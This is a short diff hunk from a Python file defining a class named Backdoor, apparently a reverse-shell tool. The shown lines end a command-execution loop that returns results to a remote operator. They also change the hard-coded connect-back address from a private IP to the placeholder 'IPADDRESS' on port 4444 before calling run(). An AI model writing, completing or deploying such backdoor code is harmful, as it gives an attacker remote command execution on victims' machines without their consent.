@@ -56,5 +56,5 @@ class Backdoor:
                 command_result = "[-] Error During Command Execution"
             self.reliable_send(command_result)
 
-my_backdoor = Backdoor("192.168.0.32", 4444)
+my_backdoor = Backdoor("IPADDRESS", 4444)
 my_backdoor.run()
